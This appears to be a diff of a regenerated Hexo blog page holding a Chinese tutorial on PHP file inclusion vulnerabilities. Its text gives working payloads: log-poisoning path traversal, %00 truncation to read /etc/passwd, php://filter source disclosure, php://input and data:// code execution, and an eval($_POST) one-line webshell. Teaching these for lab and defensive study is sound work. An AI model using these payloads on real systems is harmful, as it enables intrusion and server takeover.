@@ -2,7 +2,7 @@
 <html lang="en">
 
 <!-- Head tag -->
-<head><meta name="generator" content="Hexo 3.8.0">
+<head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -25,14 +25,20 @@
     <link rel="canonical" href="https://pengpengp.github.io/2019/02/17/文件包含/">
 
     <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
 
     <!-- Custom CSS -->
-    <link rel="stylesheet" href="/css/blog-style.css">
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
 
     <!-- Pygments Github CSS -->
-    <link rel="stylesheet" href="/css/syntax.css">
-</head>
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <style>
 
@@ -43,8 +49,8 @@
 <!-- hack iOS CSS :active style -->
 <body ontouchstart="" class="animated fadeIn">
 <!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
-" data-ishome="false">
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
     <div class="container-fluid">
         <!-- Brand and toggle get grouped for better mobile display -->
         <div class="navbar-header page-scroll">
@@ -119,7 +125,8 @@
 <!--only post-->
 
 
-<img class="wechat-title-img" src="">
+<img class="wechat-title-img"
+     src="">
 
 
 <style>
@@ -146,7 +153,8 @@
                     </span>
                     <div class="tags text-center">
                         
-                        <a class="tag" href="/tags/#文件包含漏洞" title="文件包含漏洞">文件包含漏洞</a>
+                        <a class="tag" href="/tags/#文件包含漏洞"
+                           title="文件包含漏洞">文件包含漏洞</a>
                         
                     </div>
                 </div>
@@ -203,8 +211,8 @@
 <blockquote>
 <p>七.文件包含漏洞.结合日志    /var/log/httpd/access_log</p>
 </blockquote>
-<p>​        写入日志文件：<br>        <a href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E" target="_blank" rel="noopener">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E</a></p>
-<p>​    查看（需要权限）<a href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log" target="_blank" rel="noopener">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log</a></p>
+<p>​        写入日志文件：<br>        <a target="_blank" rel="noopener" href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E</a></p>
+<p>​    查看（需要权限）<a target="_blank" rel="noopener" href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log</a></p>
 <p>​    然后可以用菜刀连</p>
 <hr>
 <blockquote>
@@ -215,7 +223,7 @@
 <blockquote>
 <p>九.本地文件包含截断</p>
 </blockquote>
-<p>​    本地常见模板：&lt;?php include(“inc/“ . $_GET[‘file’] . “.htm”); ?&gt; </p>
+<p>​    本地常见模板：<?php include("inc/" . $_GET['file'] . ".htm"); ?> </p>
 <p>​    1.绕过方法(转)：%00截断<br>        /etc/passwd%00<br>        (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
 <p>​    2.%00截断目录遍历：<br>        /var/www/%00<br>        (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
 <p>​    3.路径长度截断：<br>        /etc/passwd/././././././.[…]/./././././.<br>        (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
@@ -227,16 +235,16 @@
 <ul>
 <li><p>常用伪协议的使用：</p>
 <p> file://</p>
-<pre><code>php://filter        ---用来读文件
+<pre><code> php://filter        ---用来读文件
 
-http://
+ http://
 
-ftp://
+ ftp://
 
-php://input        ---用来读post数据
+ php://input        ---用来读post数据
 
-data://text/plain,1    ---用来修改读取的数据为1
-</code></pre></li>
+ data://text/plain,1    ---用来修改读取的数据为1</code></pre>
+</li>
 <li><p>综合前提：</p>
 <p> open_basedir</p>
 <p> include $_GET[]能用所有伪协议<br> include $_GET[].”.inc”能用http伪协议，其他形式都用不了伪协议</p>
@@ -244,13 +252,14 @@ data://text/plain,1    ---用来修改读取的数据为1
 </li>
 </ul>
 <p>   -&gt;1.file://的使用</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">条件：allow_url_fopen  on/off</span><br><span class="line">allow_url_include on/off这两条不限制</span><br></pre></td></tr></table></figure>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">条件：allow_url_fopen  on&#x2F;off</span><br><span class="line">allow_url_include on&#x2F;off这两条不限制</span><br></pre></td></tr></table></figure>
+
 <p>   ​<br>   使用：<code>http://www.ad.com/include.php?path=file://c:\aa.txt</code></p>
 <p>   -&gt;2.php://filter用法：前面部分是固定的</p>
 <pre><code>    `php://filter/read/convert.base64-encode/resource=路径+文件名`
 
-得到加密的代码，用base64解码既可以得到php文件内容    
-</code></pre><p>​    </p>
+得到加密的代码，用base64解码既可以得到php文件内容    </code></pre>
+<p>​    </p>
 <p>​    -&gt;3.php://input的条件及使用</p>
 <p>​    条件：allow_url_include  on   远程文件包含开启</p>
 <p>使用：<br>    地址栏为：<code>include.php?path=php://input</code><br>    然后post发包：    <code>&lt;?php phpinfo();?&gt;</code>（post写要执行的php内容就可以被执行）<br>    写一句话的方法： <code>file_put_contents(&lt;?php eval($_POST[&#39;pass&#39;])?&gt;)</code></p>
@@ -259,7 +268,7 @@ data://text/plain,1    ---用来修改读取的数据为1
 <p>​    条件 allow_url_fopen on<br>    allow_url_include   on</p>
 <p>使用：<code>file=data://text/plain,&lt;?php phpinfo();?&gt;</code><br>    或者转为base64:<code>file=data://text/plain;base64,Kjmx()9wadalniaqfhq9fHQ9fh</code></p>
 <p>题外:判断access还是sql server数据库：<br>        <code>and exists(select count(*) from sysobjects;)</code><br>        sysobjects库只有sql server有</p>
-<p><a href="http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php">http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php</a></p>
 <hr>
 <blockquote>
 <p>十一. 防御方法：</p>
@@ -273,12 +282,14 @@ data://text/plain,1    ---用来修改读取的数据为1
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2019/02/18/redis未授权漏洞/" data-toggle="tooltip" data-placement="top" title="redis未授权漏洞">&larr; Previous Post</a>
+                        <a href="/2019/02/18/redis未授权漏洞/" data-toggle="tooltip" data-placement="top"
+                           title="redis未授权漏洞">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/2019/01/16/shell-rebound/" data-toggle="tooltip" data-placement="top" title="shell_rebound">Next Post &rarr;</a>
+                        <a href="/2019/01/16/shell-rebound/" data-toggle="tooltip" data-placement="top"
+                           title="shell_rebound">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -349,11 +360,11 @@ data://text/plain,1    ---用来修改读取的数据为1
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2019
+                    Copyright &copy; pengpengp&#39;s BLOG 2020
                     <br>
                     <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
                     <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
                 </p>
 
             </div>
@@ -362,13 +373,19 @@ data://text/plain,1    ---用来修改读取的数据为1
 </footer>
 
 <!-- jQuery -->
+
 <script src="/js/jquery.min.js"></script>
 
+
 <!-- Bootstrap Core JavaScript -->
+
 <script src="/js/bootstrap.min.js"></script>
 
+
 <!-- Custom Theme JavaScript -->
+
 <script src="/js/blog.js"></script>
+
 
 <!-- async load function -->
 <script>
